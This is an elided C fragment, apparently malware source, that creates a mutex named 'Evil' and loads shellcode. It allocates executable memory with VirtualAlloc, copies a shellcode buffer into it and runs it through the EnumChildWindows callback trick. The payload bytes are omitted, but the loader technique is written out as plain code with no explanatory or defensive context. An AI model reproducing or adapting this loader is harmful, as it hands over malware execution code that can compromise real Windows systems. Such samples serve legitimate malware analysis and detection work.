...
int main() {
	...
	HANDLE hMutex = CreateMutexA(NULL, FALSE, "Evil");
	...
	// Inject shellcode
	LPVOID lpAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAddr) {
		RtlMoveMemory(lpAddr, shellcode, sizeof(shellcode));
		EnumChildWindows(NULL, (WNDENUMPROC)lpAddr, NULL);
	}
